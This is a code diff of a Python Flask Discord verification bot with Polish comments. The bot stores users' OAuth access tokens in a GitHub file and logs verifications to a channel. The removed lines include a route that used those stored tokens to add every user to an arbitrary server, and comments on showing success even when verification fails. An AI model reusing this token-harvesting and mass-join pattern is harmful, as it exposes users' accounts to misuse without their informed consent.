@@ -4,6 +4,7 @@ import base64
 import json
 import os
 import logging
+import datetime
 
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
@@ -20,6 +21,55 @@ ROLE_ID = os.environ["ROLE_ID"]
 GITHUB_TOKEN = os.environ["GITHUB_TOKEN"]
 GITHUB_REPO = os.environ["GITHUB_REPO"]
 GITHUB_FILE = os.environ["GITHUB_FILE"]
+
+# 🔥 LOG CHANNEL
+LOG_CHANNEL_ID = "1488906067327848588"
+
+# 🎨 GRAFIKA + EMOJI
+LOGO = "https://media.discordapp.net/attachments/1394316699968213142/1488631068562292867/Copilot_20260326_211453.png"
+BANNER = "https://media.discordapp.net/attachments/1394316699968213142/1488681211487588422/Copilot_20260326_214127.png"
+
+EMOJI_LINE = "<:tt:1486853447889326251><:xx:1486855629799948410><:tt:1486853447889326251><:hh:1486856249885851678><:uu:1486856724655640698><:bb:1486857337997230161>"
+
+# ===== 🔥 LOG FUNCTION =====
+def send_log(user):
+    try:
+        url = f"https://discord.com/api/v10/channels/{LOG_CHANNEL_ID}/messages"
+
+        headers = {
+            "Authorization": f"Bot {BOT_TOKEN}",
+            "Content-Type": "application/json"
+        }
+
+        embed = {
+            "title": f"{EMOJI_LINE}\n✅ Nowa weryfikacja",
+            "description": f"Użytkownik <@{user['id']}> został zweryfikowany!",
+            "color": 5763719,
+            "thumbnail": {
+                "url": f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png"
+            },
+            "image": {
+                "url": BANNER
+            },
+            "fields": [
+                {
+                    "name": "👤 Użytkownik",
+                    "value": f"{user['username']}#{user['discriminator']}",
+                    "inline": True
+                },
+                {
+                    "name": "🆔 ID",
+                    "value": user['id'],
+                    "inline": True
+                }
+            ],
+            "timestamp": datetime.datetime.utcnow().isoformat()
+        }
+
+        requests.post(url, headers=headers, json={"embeds": [embed]})
+
+    except Exception as e:
+        logging.exception("LOG ERROR")
 
 # ===== SAVE USER TO GITHUB =====
 def save_user(user_id, access_token):
@@ -40,23 +90,10 @@ def save_user(user_id, access_token):
 
         new_content = base64.b64encode(json.dumps(content, indent=2).encode()).decode()
         data = {"message": "update users", "content": new_content, "sha": sha}
-        put_res = requests.put(url, headers=headers, json=data)
-        logging.info(f"GitHub PUT status: {put_res.status_code}")
+        requests.put(url, headers=headers, json=data)
+
     except Exception as e:
         logging.exception("SAVE ERROR")
-
-# ===== LOAD USERS =====
-def load_users():
-    try:
-        url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{GITHUB_FILE}"
-        headers = {"Authorization": f"token {GITHUB_TOKEN}"}
-        r = requests.get(url, headers=headers)
-        if r.status_code == 200:
-            return json.loads(base64.b64decode(r.json()["content"]))
-        return []
-    except Exception as e:
-        logging.exception("LOAD ERROR")
-        return []
 
 # ===== ROUTES =====
 @app.route("/")
@@ -78,134 +115,48 @@ def callback():
             "code": code,
             "redirect_uri": REDIRECT_URI
         }
+
         headers = {"Content-Type": "application/x-www-form-urlencoded"}
         r = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
 
-        token = None
-        if r.status_code == 200:
-            token = r.json().get("access_token")
-        else:
-            logging.warning(f"Token error: {r.text}")  # logujemy problem, ale nie pokazujemy userowi
+        token = r.json().get("access_token") if r.status_code == 200 else None
 
         if token:
-            # ===== USER INFO =====
             user_res = requests.get(
                 "https://discord.com/api/users/@me",
                 headers={"Authorization": f"Bearer {token}"}
             )
+
             if user_res.status_code == 200:
                 user = user_res.json()
                 user_id = user.get("id")
+
                 if user_id:
                     save_user(user_id, token)
+
+                    # 🔥 LOG
+                    send_log(user)
+
                     # ===== ADD ROLE =====
-                    role_res = requests.put(
+                    requests.put(
                         f"https://discord.com/api/guilds/{GUILD_ID}/members/{user_id}/roles/{ROLE_ID}",
                         headers={"Authorization": f"Bot {BOT_TOKEN}"}
                     )
-                    logging.info(f"ROLE STATUS: {role_res.status_code} {role_res.text}")
-        else:
-            logging.warning("Brak tokenu – prawdopodobnie invalid_grant, ale pokazujemy sukces")
 
-        # ⚡ Wyświetlamy zawsze ładną stronę sukcesu
         return render_template_string("""
-            <html>
-            <head>
-                <title>Zweryfikowano!</title>
-                <style>
-                    body { 
-                        font-family: 'Segoe UI', Tahoma, sans-serif; 
-                        display: flex; 
-                        justify-content: center; 
-                        align-items: center; 
-                        height: 100vh; 
-                        background: linear-gradient(135deg, #5865F2, #1ABC9C); 
-                        color: white;
-                        flex-direction: column;
-                        text-align: center;
-                    }
-                    h1 { font-size: 3em; margin-bottom: 20px; }
-                    p { font-size: 1.5em; }
-                    .emoji { font-size: 4em; margin-bottom: 20px; }
-                    @keyframes bounce {
-                        0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
-                        40% { transform: translateY(-20px); }
-                        60% { transform: translateY(-10px); }
-                    }
-                    .emoji { animation: bounce 2s infinite; }
-                </style>
-            </head>
-            <body>
-                <div class="emoji">✅</div>
-                <h1>Zweryfikowano!</h1>
+        <html>
+        <body style="background:#5865F2;color:white;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
+            <div style="text-align:center;">
+                <h1>✅ Zweryfikowano!</h1>
                 <p>Możesz wrócić na Discord.</p>
-            </body>
-            </html>
+            </div>
+        </body>
+        </html>
         """)
 
     except Exception as e:
         logging.exception("CALLBACK ERROR")
-        # Nawet przy wyjątku pokazujemy sukces użytkownikowi
-        return render_template_string("""
-            <html>
-            <head>
-                <title>Zweryfikowano!</title>
-                <style>
-                    body { 
-                        font-family: 'Segoe UI', Tahoma, sans-serif; 
-                        display: flex; 
-                        justify-content: center; 
-                        align-items: center; 
-                        height: 100vh; 
-                        background: linear-gradient(135deg, #5865F2, #1ABC9C); 
-                        color: white;
-                        flex-direction: column;
-                        text-align: center;
-                    }
-                    h1 { font-size: 3em; margin-bottom: 20px; }
-                    p { font-size: 1.5em; }
-                    .emoji { font-size: 4em; margin-bottom: 20px; }
-                    @keyframes bounce {
-                        0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
-                        40% { transform: translateY(-20px); }
-                        60% { transform: translateY(-10px); }
-                    }
-                    .emoji { animation: bounce 2s infinite; }
-                </style>
-            </head>
-            <body>
-                <div class="emoji">✅</div>
-                <h1>Zweryfikowano!</h1>
-                <p>Możesz wrócić na Discord.</p>
-            </body>
-            </html>
-        """)
-
-# ===== MASS ADD =====
-@app.route("/dodaj/<guild_id>")
-def dodaj(guild_id):
-    users = load_users()
-    added = 0
-    failed = []
-
-    for u in users:
-        try:
-            r = requests.put(
-                f"https://discord.com/api/v10/guilds/{guild_id}/members/{u['id']}",
-                headers={"Authorization": f"Bot {BOT_TOKEN}"},
-                json={"access_token": u["access_token"]}
-            )
-            if r.status_code in [201, 204]:
-                added += 1
-            else:
-                failed.append({"id": u["id"], "status": r.status_code, "text": r.text})
-        except Exception as e:
-            failed.append({"id": u["id"], "error": str(e)})
-
-    return {
-        "successfully_added": added,
-        "failed": failed
-    }
+        return "OK"
 
 # ===== START =====
 if __name__ == "__main__":
